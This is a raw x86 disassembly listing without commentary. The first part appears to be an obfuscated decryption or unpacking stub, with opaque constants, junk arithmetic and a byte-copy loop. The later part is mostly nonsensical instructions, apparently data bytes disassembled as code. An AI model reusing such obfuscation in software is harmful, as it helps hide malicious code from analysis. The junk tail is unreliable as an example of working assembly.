  4215b7:	push   0x428b5f
  4215bc:	push   0x428b6b
  4215c1:	call   edi
  4215c3:	test   eax,eax
  4215c5:	je     0x420849
  4215cb:	mov    al,ds:0x428b78
  4215d0:	cmp    al,BYTE PTR ds:0x428b89
  4215d6:	jne    0x420849
  4215dc:	mov    al,ds:0x428b95
  4215e1:	cmp    al,BYTE PTR ds:0x428ba6
  4215e7:	jne    0x420849
  4215ed:	push   0x428baf
  4215f2:	push   0x428bbb
  4215f7:	call   edi
  4215f9:	test   eax,eax
  4215fb:	je     0x420849
  421601:	mov    al,ds:0x428bc8
  421606:	cmp    al,BYTE PTR ds:0x428bd9
  42160c:	jne    0x420849
  421612:	mov    al,ds:0x428be5
  421617:	cmp    al,BYTE PTR ds:0x428bf6
  42161d:	jne    0x420849
  421623:	push   0x428bff
  421628:	push   0x428c0b
  42162d:	call   edi
  42162f:	test   eax,eax
  421631:	je     0x420849
  421637:	mov    eax,DWORD PTR [esp+0x3c]
  42163b:	cmp    eax,0xf89c85a4
  421640:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esp+0x20]
  42164a:	mov    ecx,DWORD PTR [esp+0x38]
  42164e:	xor    eax,esi
  421650:	add    eax,ebx
  421652:	cmp    eax,ecx
  421654:	je     0x42169f
  42165a:	mov    eax,ds:0x428373
  42165f:	mov    eax,DWORD PTR [eax+0x194]
  421665:	mov    ecx,DWORD PTR [eax]
  421667:	mov    eax,DWORD PTR [ecx+0x3c]
  42166a:	push   DWORD PTR ds:0x428453
  421670:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  421674:	push   DWORD PTR ds:0x4281f7
  42167a:	add    eax,ecx
  42167c:	mov    ecx,DWORD PTR ds:0x428373
  421682:	mov    ecx,DWORD PTR [ecx+0x194]
  421688:	push   DWORD PTR [ecx]
  42168a:	call   eax
  42168c:	mov    ecx,DWORD PTR ds:0x428373
  421692:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421698:	mov    DWORD PTR [ecx],eax
  42169a:	jmp    0x421870
  42169f:	mov    eax,DWORD PTR [esp+0x20]
  4216a3:	mov    ecx,DWORD PTR [esp+0x40]
  4216a7:	xor    eax,esi
  4216a9:	add    eax,ebx
  4216ab:	cmp    eax,ecx
  4216ad:	jne    0x421718
  4216b3:	mov    eax,DWORD PTR [esp+0x20]
  4216b7:	mov    ecx,DWORD PTR ds:0x428373
  4216bd:	mov    ecx,DWORD PTR [ecx+0x198]
  4216c3:	xor    eax,esi
  4216c5:	add    eax,ebx
  4216c7:	cmp    eax,DWORD PTR [ecx]
  4216c9:	jne    0x4216f1
  4216cf:	mov    eax,DWORD PTR [esp+0x20]
  4216d3:	push   0xffffffff
  4216d5:	push   0x70941f91
  4216da:	xor    eax,esi
  4216dc:	add    eax,ebx
  4216de:	push   eax
  4216df:	push   0xf89c85a1
  4216e4:	push   DWORD PTR [esp+0x1c]
  4216e8:	push   DWORD PTR [esp+0x34]
  4216ec:	call   0x41b999
  4216f1:	push   DWORD PTR [esp+0xc]
  4216f5:	push   DWORD PTR [esp+0x24]
  4216f9:	call   0x401000
  4216fe:	mov    eax,DWORD PTR [esp+0x20]
  421702:	xor    eax,esi
  421704:	add    eax,ebx
  421706:	mov    ds:0x4283ff,eax
  42170b:	mov    eax,DWORD PTR [esp+0x20]
  42170f:	xor    eax,esi
  421711:	add    eax,ebx
  421713:	mov    ds:0x4283f7,eax
  421718:	mov    eax,DWORD PTR [esp+0x2c]
  42171c:	test   eax,eax
  42171e:	je     0x421870
  421724:	mov    DWORD PTR [esp+0x4c],0xf152c3c
  42172c:	mov    DWORD PTR [esp+0x54],0x712ed2f
  421734:	mov    DWORD PTR [esp+0x48],0x373fc0d
  42173c:	mov    DWORD PTR [esp+0x50],0x72670add
  421744:	call   0x41932f
  421749:	mov    eax,DWORD PTR [esp+0x34]
  42174d:	mov    eax,DWORD PTR [esp+0xc]
  421751:	mov    DWORD PTR [esp+0x30],eax
  421755:	mov    eax,DWORD PTR [esp+0x20]
  421759:	mov    DWORD PTR [esp+0xc],eax
  42175d:	mov    eax,eax
  42175f:	mov    eax,ds:0x428373
  421764:	mov    ecx,DWORD PTR [eax+0x1c0]
  42176a:	mov    edx,DWORD PTR [ecx]
  42176c:	and    DWORD PTR [esp+0x14],0x0
  421771:	mov    edi,0xfabdbed2
  421776:	add    edx,edi
  421778:	adc    DWORD PTR [esp+0x14],0xffffffff
  42177d:	mov    ecx,0x8a29a143
  421782:	xor    edx,ecx
  421784:	mov    DWORD PTR [esp+0x18],edx
  421788:	mov    edx,DWORD PTR [esp+0x14]
  42178c:	xor    edx,0x0
  42178f:	cmp    DWORD PTR [esp+0x18],0x70941f90
  421797:	mov    DWORD PTR [esp+0x1c],edx
  42179b:	jne    0x4217aa
  4217a1:	cmp    edx,0xffffffff
  4217a4:	je     0x421813
  4217aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4217b0:	mov    eax,DWORD PTR [eax]
  4217b2:	cdq    
  4217b3:	add    eax,edi
  4217b5:	adc    edx,0xffffffff
  4217b8:	and    DWORD PTR [esp+0x14],0x0
  4217bd:	xor    edx,0x0
  4217c0:	mov    DWORD PTR [esp+0x24],edx
  4217c4:	mov    edx,DWORD PTR [esp+0xc]
  4217c8:	mov    DWORD PTR [esp+0x10],edx
  4217cc:	xor    eax,ecx
  4217ce:	add    DWORD PTR [esp+0x10],edi
  4217d2:	mov    edx,DWORD PTR [esp+0x10]
  4217d6:	adc    DWORD PTR [esp+0x14],0xffffffff
  4217db:	xor    edx,ecx
  4217dd:	mov    DWORD PTR [esp+0x18],edx
  4217e1:	mov    edx,DWORD PTR [esp+0x14]
  4217e5:	xor    edx,0x0
  4217e8:	mov    DWORD PTR [esp+0x1c],edx
  4217ec:	cmp    DWORD PTR [esp+0x18],eax
  4217f0:	jne    0x421802
  4217f6:	mov    eax,DWORD PTR [esp+0x24]
  4217fa:	cmp    edx,eax
  4217fc:	je     0x421813
  421802:	mov    eax,DWORD PTR [esp+0xc]
  421806:	add    eax,DWORD PTR [esp+0x30]
  42180a:	mov    DWORD PTR [esp+0xc],eax
  42180e:	jmp    0x421870
  421813:	mov    eax,ds:0x4283f7
  421818:	mov    edx,DWORD PTR ds:0x4283ff
  42181e:	xor    eax,edx
  421820:	mov    ds:0x4283f7,eax
  421825:	mov    edx,DWORD PTR ds:0x4283f7
  42182b:	mov    eax,DWORD PTR [esp+0x2c]
  42182f:	add    DWORD PTR [eax],edx
  421831:	mov    edx,DWORD PTR [esp+0xc]
  421835:	mov    eax,ds:0x4283f7
  42183a:	xor    edx,esi
  42183c:	add    edx,ebx
  42183e:	xor    ebx,ebx
  421840:	add    edx,edi
  421842:	adc    ebx,0xffffffff
  421845:	xor    esi,esi
  421847:	xor    edx,ecx
  421849:	xor    ebx,0x0
  42184c:	add    eax,edi
  42184e:	adc    esi,0xffffffff
  421851:	xor    eax,ecx
  421853:	xor    esi,0x0
  421856:	cmp    eax,edx
  421858:	jne    0x421870
  42185e:	cmp    esi,ebx
  421860:	jne    0x421870
  421866:	mov    eax,ds:0x4283f7
  42186b:	mov    ds:0x4283ff,eax
  421870:	mov    eax,ds:0x428373
  421875:	push   0x4
  421877:	add    eax,0x1cc
  42187c:	push   eax
  42187d:	lea    eax,[esp+0x3c]
  421881:	push   eax
  421882:	call   0x421896
  421887:	mov    eax,DWORD PTR [esp+0x34]
  42188b:	mov    eax,DWORD PTR [eax]
  42188d:	pop    edi
  42188e:	pop    esi
  42188f:	pop    ebx
  421890:	mov    esp,ebp
  421892:	pop    ebp
  421893:	ret    0xc
  421896:	push   ebp
  421897:	mov    ebp,esp
  421899:	sub    esp,0x10
  42189c:	mov    eax,0xf89c85a5
  4218a1:	mov    DWORD PTR [ebp-0x4],eax
  4218a4:	mov    DWORD PTR ds:0x428ecb,0x1d
  4218ae:	cmp    DWORD PTR ds:0x428ecb,0x0
  4218b5:	je     0x421906
  4218bb:	cmp    DWORD PTR ds:0x428ecb,0x8
  4218c2:	jg     0x421906
  4218c8:	jmp    0x4218d8
  4218cd:	push   0x428e77
  4218d2:	call   DWORD PTR ds:0x42aa37
  4218d8:	cmp    DWORD PTR ds:0x428ecb,0x9
  4218df:	jne    0x4218f2
  4218e5:	mov    edx,DWORD PTR ds:0x428ecb
  4218eb:	dec    edx
  4218ec:	mov    DWORD PTR ds:0x428ecb,edx
  4218f2:	xor    edx,edx
  4218f4:	add    edx,DWORD PTR ds:0x428ecb
  4218fa:	dec    edx
  4218fb:	mov    DWORD PTR ds:0x428ecb,edx
  421901:	jmp    0x4218ae
  421906:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  42190d:	xor    ecx,edx
  42190f:	mov    ecx,DWORD PTR [ebp-0x4]
  421912:	sbb    edx,0x5246
  421918:	push   esi
  421919:	or     DWORD PTR ds:0x428e5b,edi
  42191f:	mov    edx,0x75108af
  421924:	adc    DWORD PTR ds:0x428e43,0x2a82
  42192e:	xor    ecx,edx
  421930:	sbb    DWORD PTR ds:0x428e93,edi
  421936:	mov    esi,0x3272f6
  42193b:	push   edi
  42193c:	inc    DWORD PTR ds:0x428e47
  421942:	mov    edi,DWORD PTR [ebp+0x10]
  421945:	adc    DWORD PTR ds:0x428e43,0x428ecf
  42194f:	add    ecx,esi
  421951:	cmp    ecx,edi
  421953:	mov    DWORD PTR ds:0x428ea3,0x27d
  42195d:	je     0x421a9e
  421963:	mov    ecx,DWORD PTR ds:0x428e33
  421969:	or     DWORD PTR ds:0x428e2b,ecx
  42196f:	mov    ecx,DWORD PTR [ebp-0x4]
  421972:	mov    edi,DWORD PTR [ebp+0x10]
  421975:	xor    eax,eax
  421977:	xor    ecx,edx
  421979:	sub    DWORD PTR ds:0x428e2b,0x428e2f
  421983:	add    ecx,esi
  421985:	xor    DWORD PTR ds:0x428e6b,0x2e89
  42198f:	add    edi,0xfabdbed2
  421995:	mov    DWORD PTR ds:0x428e27,0xdb6
  42199f:	adc    eax,0xffffffff
  4219a2:	adc    DWORD PTR ds:0x428e23,0x428e77
  4219ac:	xor    eax,0x0
  4219af:	mov    DWORD PTR [ebp-0xc],eax
  4219b2:	push   ebx
  4219b3:	mov    eax,ds:0x428e37
  4219b8:	add    eax,DWORD PTR ds:0x428ebf
  4219be:	mov    ds:0x428e37,eax
  4219c3:	xor    ebx,ebx
  4219c5:	adc    DWORD PTR ds:0x428e4b,0x1a92
  4219cf:	xor    edi,0x8a29a143
  4219d5:	adc    eax,DWORD PTR ds:0x428e3b
  4219db:	mov    eax,ecx
  4219dd:	xor    DWORD PTR ds:0x428e4b,0x428e93
  4219e7:	add    eax,0xfabdbed2
  4219ec:	mov    DWORD PTR ds:0x428e2b,0x4aa
  4219f6:	adc    ebx,0xffffffff
  4219f9:	xor    eax,0x8a29a143
  4219fe:	and    DWORD PTR ds:0x428e9f,0x428e57
  421a08:	xor    ebx,0x0
  421a0b:	mov    DWORD PTR ds:0x428e3b,0x3b6d
  421a15:	cmp    eax,edi
  421a17:	jne    0x421a30
  421a1d:	cmp    ebx,DWORD PTR [ebp-0xc]
  421a20:	je     0x421a98
  421a26:	jmp    0x421a30
  421a2b:	mov    esi,0x3272f6
  421a30:	mov    eax,DWORD PTR [ebp-0x4]
  421a33:	mov    edi,DWORD PTR [ebp-0x8]
  421a36:	xor    edi,edx
  421a38:	add    edi,esi
  421a3a:	mov    esi,DWORD PTR [ebp+0x8]
  421a3d:	imul   edi,ecx
  421a40:	mov    ebx,DWORD PTR [ebp+0xc]
  421a43:	xor    eax,edx
  421a45:	add    eax,ecx
  421a47:	mov    al,BYTE PTR [ebx+eax*1+0x3272f6]
  421a4e:	mov    BYTE PTR [edi+esi*1],al
  421a51:	mov    eax,DWORD PTR [ebp-0x8]
  421a54:	mov    esi,DWORD PTR [ebp+0x10]
  421a57:	xor    eax,edx
  421a59:	xor    ebx,ebx
  421a5b:	add    esi,0xfabdbed2
  421a61:	adc    ebx,0xffffffff
  421a64:	lea    ecx,[ecx+eax*1+0x3272f6]
  421a6b:	xor    edi,edi
  421a6d:	xor    esi,0x8a29a143
  421a73:	xor    ebx,0x0
  421a76:	mov    eax,ecx
  421a78:	add    eax,0xfabdbed2
  421a7d:	adc    edi,0xffffffff
  421a80:	xor    eax,0x8a29a143
  421a85:	xor    edi,0x0
  421a88:	cmp    eax,esi
  421a8a:	jne    0x421a2b
  421a90:	cmp    edi,ebx
  421a92:	jne    0x421a2b
  421a98:	mov    eax,0xf89c85a4
  421a9d:	pop    ebx
  421a9e:	pop    edi
  421a9f:	pop    esi
  421aa0:	leave  
  421aa1:	ret    0xc
  421aa4:	push   ebp
  421aa5:	mov    ebp,esp
  421aa7:	push   ecx
  421aa8:	dec    eax
  421aa9:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  421ab0:	mov    ecx,DWORD PTR ds:0x428ea7
  421ab6:	sub    DWORD PTR ds:0x428e93,ecx
  421abc:	jmp    0x423e02
  421ac1:	loope  0x421acb
  421ac3:	jg     0x421b24
  421ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac6:	add    al,0xe1
  421ac8:	test   BYTE PTR [ecx-0x2c42adb6],al
  421ace:	mov    ecx,0xb66fda17
  421ad3:	add    BYTE PTR [ebx-0x7c7c9fa6],0x4b
  421ada:	or     dh,BYTE PTR [ecx]
  421adc:	or     cl,bh
  421ade:	cmp    al,0x70
  421ae0:	push   ss
  421ae1:	(bad)  
  421ae2:	add    al,0xe8
  421ae4:	push   eax
  421ae5:	loop   0x421b0d
  421ae7:	ficomp WORD PTR ds:[edx-0x50]
  421aeb:	add    eax,0x1291e685
  421af0:	and    dh,al
  421af2:	pop    edx
  421af3:	test   DWORD PTR [esi+0x77],ecx
  421af6:	pusha  
  421af7:	mov    ds:0xcf941407,eax
  421afc:	repnz gs push eax
  421aff:	add    BYTE PTR [ecx+0x4a86b3a5],bl
  421b05:	out    dx,al
  421b06:	mov    edx,0xd4982806
  421b0b:	imul   esi,DWORD PTR [edx+0x28],0x7f
  421b0f:	sub    eax,0x5551dcc1
  421b14:	sub    edi,edx
  421b16:	fst    QWORD PTR [eax-0x60c4d05e]
  421b1c:	xor    edx,edx
  421b1e:	retf   
  421b1f:	xor    edx,DWORD PTR [ebp-0x268c78be]
  421b25:	push   esp
  421b26:	loop   0x421b9e
  421b28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b29:	fiadd  WORD PTR [esi+eax*4]
  421b2c:	or     al,0x45
  421b2e:	mov    dl,0xa7
  421b30:	or     eax,esi
  421b32:	test   al,0x35
  421b34:	loop   0x421b03
  421b36:	(bad)  [eax]
  421b38:	mov    ds:0x7e3eb622,eax
  421b3d:	lods   eax,DWORD PTR ds:[esi]
  421b3e:	lock loope 0x421bbc
  421b41:	mov    eax,DWORD PTR [edi]
  421b43:	test   al,0x3a
  421b45:	push   0x68
  421b47:	mov    esi,0xd8b57162
  421b4c:	shl    ebp,0x64
  421b4f:	and    eax,0x2b24cf3
  421b54:	jne    0x421b3e
  421b56:	dec    ebp
  421b57:	pop    ss
  421b58:	or     eax,0x23e9d1d5
  421b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b5e:	cs retw 
  421b61:	mov    ah,cl
  421b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b64:	mov    cl,0xc7
  421b66:	(bad)  
  421b67:	lock adc ebx,0x59733db6
  421b6e:	out    0x7b,al
  421b70:	int    0x95
  421b72:	call   0x34d4:0xa2bb2623
  421b79:	jnp    0x421b1d
  421b7b:	xor    eax,0x5b302333
  421b80:	ins    BYTE PTR es:[edi],dx
  421b81:	fisubr WORD PTR [edi]
  421b83:	or     al,0x4d
  421b85:	adc    BYTE PTR [eax+0x2187cc21],al
  421b8b:	daa    
  421b8c:	popf   
  421b8d:	lds    ebx,FWORD PTR [ecx+0x3d]
  421b90:	popa   
  421b91:	adc    eax,DWORD PTR [ecx+eax*1+0x5602c639]
  421b98:	lock sahf 
  421b9a:	cmp    eax,0x180084a4
  421b9f:	mov    edi,0x2538eca8
  421ba4:	adc    dl,ah
  421ba6:	lods   al,BYTE PTR ds:[esi]
  421ba7:	cmp    al,0xa6
  421ba9:	or     cl,BYTE PTR [edx+0x47365cec]
  421baf:	ficom  WORD PTR [eax-0x2bc579f0]
  421bb5:	push   esp
  421bb6:	inc    ecx
  421bb7:	adc    esi,DWORD PTR [edx-0x80]
  421bba:	loope  0x421c18
  421bbc:	add    ch,BYTE PTR [ebp+0x6c]
  421bbf:	push   ss
  421bc0:	jb     0x421b47
  421bc2:	jle    0x421b67
  421bc4:	gs aas 
  421bc6:	dec    esi
  421bc7:	hlt    
  421bc8:	mov    esp,0xbce6d60c
  421bcd:	out    dx,al
  421bce:	rcl    DWORD PTR [eax+0x2f],cl
  421bd1:	test   DWORD PTR [edi+0x64],ebx
  421bd4:	not    BYTE PTR [edi]
  421bd6:	pop    ds
  421bd7:	adc    al,0xe4
  421bd9:	jns    0x421c42
  421bdb:	mov    esp,esp
  421bdd:	xchg   edi,eax
  421bde:	in     al,dx
  421bdf:	imul   ecx,DWORD PTR [ebx+0x64],0x8fbca34c
  421be6:	test   eax,0x6faa7ef0
  421beb:	int    0xc7
  421bed:	push   es
  421bee:	in     eax,dx
  421bef:	enter  0x270e,0xab
  421bf3:	lea    esp,[edx-0x13f3786a]
  421bf9:	mov    esi,0xfaa8ffc6
  421bfe:	outs   dx,BYTE PTR ds:[esi]
  421bff:	test   DWORD PTR [ecx-0x9],eax
  421c02:	mov    ds,ecx
  421c04:	jecxz  0x421c24
  421c06:	loopne 0x421c05
  421c08:	pop    eax
  421c09:	add    al,0x9f
  421c0b:	push   0x40616952
  421c10:	out    0xd7,al
  421c12:	cdq    
  421c13:	cmp    BYTE PTR [eax-0x12d33cb9],ah
  421c19:	jmp    0x421c6c
  421c1b:	lock jp 0x421bdd
  421c1e:	adc    al,0x90
  421c20:	iret   
  421c21:	push   ecx
  421c22:	addr16 pop eax
  421c24:	imul   edx,DWORD PTR [edx],0x7a
  421c27:	inc    edi
  421c28:	pop    esp
  421c29:	pop    edi
  421c2a:	mov    al,ds:0xa9e57df2
  421c2f:	sub    BYTE PTR [ebx-0x7577ba6a],cl
  421c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c36:	jmp    0x90dd73d8
  421c3b:	xchg   ebx,eax
  421c3c:	xor    BYTE PTR gs:[esi-0x51],0xa
  421c41:	xchg   esi,eax
  421c42:	bound  esi,QWORD PTR ds:0x45cdf33c
  421c48:	sti    
  421c49:	mov    esp,0xe4bbfb96
  421c4e:	fwait
  421c4f:	xor    al,0x21
  421c51:	push   0x11588c27
  421c56:	sbb    ch,BYTE PTR [edi+0x6ea66e70]
  421c5c:	cli    
  421c5d:	add    BYTE PTR [edi+edx*1-0x72ff234f],0xb5
  421c65:	jne    0x421cd8
  421c67:	mov    ebp,0x2950062c
  421c6c:	or     DWORD PTR ds:0x8cd54082,eax
  421c72:	adc    BYTE PTR [ecx-0x5ec2822e],al
  421c78:	outs   dx,DWORD PTR ds:[esi]
  421c79:	fwait
  421c7a:	push   edx
  421c7b:	in     eax,0xea
  421c7d:	sbb    dl,BYTE PTR [edi+0x1f]
  421c80:	jle    0x421c31
  421c82:	jmp    0xf72a:0xb6585cca
  421c89:	sbb    DWORD PTR [edx],0xffffffed
  421c8c:	fnstenv [edi]
  421c8e:	push   ecx
  421c8f:	jnp    0x9f9d7b49
  421c95:	mov    al,0xec
  421c97:	pop    esp
  421c98:	push   ebx
  421c99:	sbb    DWORD PTR [ebp+eiz*4-0x5c],edi
  421c9d:	sub    al,0xef
  421c9f:	dec    esp
  421ca0:	sub    eax,0xde1abcce
  421ca5:	stos   DWORD PTR es:[edi],eax
  421ca6:	cmp    bl,BYTE PTR [eax-0x2b]
  421ca9:	and    ebx,DWORD PTR [edi-0x56]
  421cac:	jmp    0x421d03
  421cae:	sbb    ecx,ebp
  421cb0:	call   0xa5d3:0xb5ae60cf
  421cb7:	jns    0x421c67
  421cb9:	dec    esp
  421cba:	cmp    WORD PTR [ecx-0x4ef3d2f4],cx
  421cc1:	std    
  421cc2:	lods   al,BYTE PTR ds:[esi]
  421cc3:	sub    DWORD PTR [edx-0x53],ebp
  421cc6:	outs   dx,DWORD PTR ds:[esi]
  421cc7:	pop    ebx
  421cc8:	or     eax,0x196f05cb
  421ccd:	dec    eax
  421cce:	cmp    ecx,DWORD PTR [edi-0x5ae8717e]
  421cd4:	sbb    dl,BYTE PTR [edi-0x14]
  421cd7:	jnp    0x421cfd
  421cd9:	inc    DWORD PTR [edi+0x39]
  421cdc:	dec    esp
  421cde:	dec    esp
  421cdf:	adc    esp,DWORD PTR [edx+0x16]
  421ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ce3:	pusha  
  421ce4:	jmp    0xf3f3:0x6448173a
  421ceb:	mov    bh,0xd5
  421ced:	xor    ebx,edi
  421cef:	imul   dh
  421cf1:	and    BYTE PTR [edx-0x42],ch
  421cf4:	out    dx,al
  421cf5:	pop    ebp
  421cf6:	fdiv   DWORD PTR [eax-0xf]
  421cf9:	sbb    ebx,edi
  421cfb:	lds    edi,FWORD PTR [ecx-0x11877b43]
  421d01:	(bad)  
  421d02:	imul   edi,DWORD PTR [esi-0x2f],0xffffffe3
  421d06:	mov    bl,0x27
  421d08:	xchg   edx,eax
  421d09:	iret   
  421d0a:	repz push esi
  421d0c:	mov    ah,0xb3
  421d0e:	sbb    bl,BYTE PTR [edi-0x12]
  421d11:	loope  0x421d0c
  421d13:	(bad)  
  421d14:	mov    ah,0xe8
  421d16:	out    dx,al
  421d17:	add    ecx,ebp
  421d19:	sbb    al,0xae
  421d1b:	shl    DWORD PTR [ebp+0x1792c936],1
  421d21:	mov    al,0xb5
  421d23:	or     BYTE PTR [edx],dl
  421d25:	xchg   esp,eax
  421d26:	fs ins BYTE PTR es:[edi],dx
  421d28:	mov    esi,0x8ee7e61
  421d2d:	push   edi
  421d2e:	mov    edi,edi
  421d30:	ds xchg edx,eax
  421d32:	mov    eax,0xd5027bbb
  421d37:	add    bl,dh
  421d39:	xchg   ebp,eax
  421d3a:	mov    cl,0x8
  421d3c:	mov    dh,0x47
  421d3e:	xchg   DWORD PTR [eax-0x252745ff],ecx
  421d44:	lock shr DWORD PTR [edx+0x5c],1
  421d48:	punpckhbw mm2,QWORD PTR [ecx+0x325fc987]
  421d4f:	fs test eax,0x47f01e38
  421d55:	mov    WORD PTR [edi-0x75],?
  421d58:	xlat   BYTE PTR ds:[ebx]
  421d59:	mov    esp,0x2c8f7f40
  421d5e:	sar    DWORD PTR [eax+0x6f5b9fb4],1
  421d64:	mov    dl,0x4
  421d66:	das    
  421d67:	daa    
  421d68:	pop    ds
  421d69:	das    
  421d6a:	lock dec ebp
  421d6c:	push   0xc946edcf
  421d71:	arpl   WORD PTR [eax-0x4b],sp
  421d74:	jae    0x421d91
  421d76:	pop    ecx
  421d77:	icebp  
  421d78:	ss push 0x3f18cd42
  421d7e:	xor    al,0xe
  421d80:	les    edx,FWORD PTR [ecx+0x19b3b814]
  421d86:	adc    bh,BYTE PTR [edi+0x250b66c0]
  421d8c:	inc    ebp
  421d8d:	sbb    BYTE PTR [ebx],0xf9
  421d90:	(bad)  
  421d91:	push   ecx
  421d92:	daa    
  421d93:	fs dec ebx
  421d95:	sti    
  421d96:	rcl    esp,0x78
  421d99:	inc    ebx
  421d9a:	loop   0x421db2
  421d9c:	fbstp  TBYTE PTR [esi+0x5a]
  421d9f:	inc    ebp
  421da0:	pop    esp
  421da1:	sbb    dh,BYTE PTR [ebp-0x1c]
  421da4:	lahf   
  421da5:	pop    ebx
  421da6:	mov    al,ds:0xcd7aa548
  421dab:	(bad)
  421daf:	cmp    al,0x12
  421db1:	imul   DWORD PTR [ebx+0x56]
  421db4:	fidivr DWORD PTR [edi-0x54]
  421db7:	push   cs
  421db8:	mov    eax,0xc6811be0
  421dbd:	repnz test BYTE PTR [edi+0x35ccb7b4],bl
  421dc4:	or     DWORD PTR [esp+eax*8-0x1f],edx
  421dc8:	xchg   edi,eax
  421dc9:	sbb    edx,DWORD PTR [edi]
  421dcb:	mov    bl,0x58
  421dcd:	xor    DWORD PTR [eax+0x470af59c],ebp
  421dd3:	mov    ecx,0x251749b2
  421dd8:	ja     0x421db0
  421dda:	mov    dh,0x39
  421ddc:	in     eax,0x8a
  421dde:	mov    dh,0x50
  421de0:	xchg   ebx,eax
  421de1:	jp     0x421d95
  421de3:	les    ebp,FWORD PTR [edi+0x1b]
  421de6:	fdiv   QWORD PTR [edx]
  421de8:	fld    DWORD PTR ds:0xb33a7ac4
  421dee:	mov    DWORD PTR [eax-0x51],0x6ce6cf58
  421df5:	mov    ebx,0x987a707b
  421dfa:	dec    ebp
  421dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dfc:	xlat   BYTE PTR ds:[ebx]
  421dfd:	jae    0x421dac
  421dff:	in     al,0x80
  421e01:	inc    ecx
  421e02:	push   ebx
  421e03:	sbb    esp,DWORD PTR [esi-0x2b]
  421e06:	sahf   
  421e07:	jp     0x421df8
  421e09:	dec    edx
  421e0a:	pushf  
  421e0b:	lods   al,BYTE PTR ds:[esi]
  421e0c:	aad    0x2a
  421e0e:	call   0xa5fae5be
  421e13:	or     eax,0xc4556113
  421e18:	mov    ds:0x86bd1aea,eax
  421e1d:	add    ecx,DWORD PTR [ebx+0x4c]
  421e20:	sahf   
  421e21:	(bad)  
  421e22:	fistp  WORD PTR [eax+0x1c41b2b]
  421e28:	ror    DWORD PTR [esi],1
  421e2a:	adc    dh,BYTE PTR es:[eax-0x4a]
  421e2e:	jge    0x421e98
  421e30:	inc    edi
  421e31:	bnd jg 0x421e9f
  421e34:	jne    0x421e09
  421e36:	mov    esp,DWORD PTR [eax]
  421e38:	mov    BYTE PTR [edx-0x2731eea0],al
  421e3e:	pcmpgtb mm6,QWORD PTR [edx]
  421e41:	mov    esi,0x88cb6ac2
  421e46:	retf   
  421e47:	stos   BYTE PTR es:[edi],al
  421e48:	and    al,0x88
  421e4a:	lds    esp,FWORD PTR [esi+esi*2-0x80]
  421e4e:	xor    eax,0x1703c9a9
  421e53:	stos   BYTE PTR es:[edi],al
  421e54:	arpl   WORD PTR [edi-0x45],si
  421e57:	adc    ebp,DWORD PTR [ebx]
  421e59:	xor    eax,0xfeef8041
  421e5e:	jbe    0x421e76
  421e60:	cmp    cl,cl
  421e62:	and    eax,0xf78f66e1
  421e67:	cs mov ebp,esi
  421e6a:	mov    ch,0xb5
  421e6c:	lahf   
  421e6d:	pop    edx
  421e6e:	add    esi,ebx
  421e70:	test   al,0xef
  421e72:	ficom  DWORD PTR [edi+eax*4-0x7f]
  421e76:	mov    eax,ds:0x14d2197b
  421e7b:	fcom   DWORD PTR es:[eax+0x48]
  421e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e80:	jbe    0x421e2d
  421e82:	sub    ah,BYTE PTR [ebx]
  421e84:	jne    0x421e5f
  421e86:	or     eax,0xc7ce8182
  421e8b:	lahf   
  421e8c:	cli    
  421e8d:	data16 sub al,0x9e
  421e90:	dec    ecx
  421e91:	pop    ds
  421e92:	les    ecx,FWORD PTR es:[esi]
  421e95:	(bad)  
  421e96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e97:	adc    esi,DWORD PTR [ebx]
  421e99:	in     al,0x29
  421e9b:	dec    esp
  421e9c:	ret    0xbd8a
  421e9f:	lea    ebx,ds:0x41fa7b37
  421ea5:	sbb    BYTE PTR [ecx-0xf],bl
  421ea8:	xor    eax,0xe0e44350
  421ead:	jne    0x421e3e
  421eaf:	xchg   ebp,eax
  421eb0:	jg     0x421eb0
  421eb2:	jb     0x421e6e
  421eb4:	and    ebp,DWORD PTR [edx+ebp*4]
  421eb7:	imul   ebx,DWORD PTR [ebx+eiz*2-0x7f9a33b9],0xffffff89
  421ebf:	pop    ebp
  421ec0:	nop
  421ec1:	add    edi,edi
  421ec3:	lea    edx,[esi+esi*2+0x11]
  421ec7:	(bad)  
  421ec8:	adc    BYTE PTR [edi-0x2ecd4691],bl
  421ece:	pushw  cs
  421ed0:	cmp    al,BYTE PTR [edx-0x71]
  421ed3:	and    ecx,DWORD PTR [ebx+0x33]
  421ed6:	push   cs
  421ed7:	add    BYTE PTR [edx],cl
  421ed9:	mov    DWORD PTR [ebp+0x45c8c1ec],edi
  421edf:	cld    
  421ee0:	(bad)  
  421ee1:	jno    0x421ea7
  421ee3:	inc    edx
  421ee4:	in     eax,0x9a
  421ee6:	sar    DWORD PTR [ecx+0x6e6b1b95],cl
  421eec:	jne    0x421ef8
  421eee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421eef:	mov    ds:0x5c4c3874,al
  421ef4:	xchg   ecx,eax
  421ef5:	or     al,0xac
  421ef7:	mov    dh,0x10
  421ef9:	jo     0x421f6d
  421efb:	mov    bh,0xdb
  421efd:	sbb    esp,esi
  421eff:	jmp    0x5770:0x38ec95dd
  421f06:	leave  
  421f07:	push   ds
  421f08:	dec    edx
  421f09:	fistp  WORD PTR [edi+0x3b]
  421f0c:	les    edx,FWORD PTR [esi]
  421f0e:	sub    esp,DWORD PTR [ebx-0x6]
  421f11:	mov    ds:0x2dccc7a2,al
  421f16:	lahf   
  421f17:	js     0x421ece
  421f19:	idiv   DWORD PTR [ecx+ebp*8]
  421f1c:	cmp    al,0xd
  421f1e:	imul   esp,DWORD PTR [ebx-0x5c4f4e42],0x452400c8
  421f28:	in     eax,dx
  421f29:	jle    0x421f13
  421f2b:	and    esp,DWORD PTR [ecx]
  421f2d:	lds    eax,FWORD PTR [ecx]
